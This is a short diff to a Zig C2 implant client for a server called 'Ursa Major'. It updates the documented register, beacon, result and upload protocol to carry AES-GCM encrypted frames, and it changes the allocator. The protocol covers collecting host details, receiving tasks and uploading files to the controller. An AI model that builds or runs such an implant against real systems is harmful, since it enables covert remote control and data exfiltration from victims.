@@ -19,15 +19,15 @@
 // PROTOCOL (Ursa Major — major/server.py)
 // ----------------------------------------
 //   POST /register  body: {hostname, username, os, arch, pid, process}
-//                   resp: {session_id: string, key: string (32-byte hex)}
+//                   resp: {session_id: string, key: string (32-byte hex), crypto: {...}}
 //
-//   POST /beacon    body: {session_id: string}
-//                   resp: {tasks: [{id, type, args}]}
+//   POST /beacon    body: {session_id: string, encrypted?: true}
+//                   resp: {data: AES-GCM frame} or {tasks: [{id, type, args}]}
 //
-//   POST /result    body: {session_id, task_id, result, error}
+//   POST /result    body: {session_id, task_id, encrypted?: true, data?: AES-GCM frame}
 //                   resp: {ok: true}
 //
-//   POST /upload    body: {session_id, filename, data: base64}
+//   POST /upload    body: {session_id, encrypted?: true, data?: AES-GCM frame}
 //                   resp: {file_id: string}
 //
 //   GET  /download/{file_id}
@@ -132,7 +132,7 @@ const Implant = struct {
     /// POST /register with:
     ///   {hostname, username, os, arch, pid, process}
     /// Response:
-    ///   {session_id: string, key: string}
+    ///   {session_id: string, key: string, crypto: object}
     ///
     /// Store session_id on self for all future requests.
     pub fn register(self: *Implant) !void {
@@ -231,7 +231,7 @@ const Implant = struct {
 };
 
 pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    var gpa = std.heap.DebugAllocator(.{}){};
     defer _ = gpa.deinit();
 
     var implant = Implant.init(gpa.allocator());
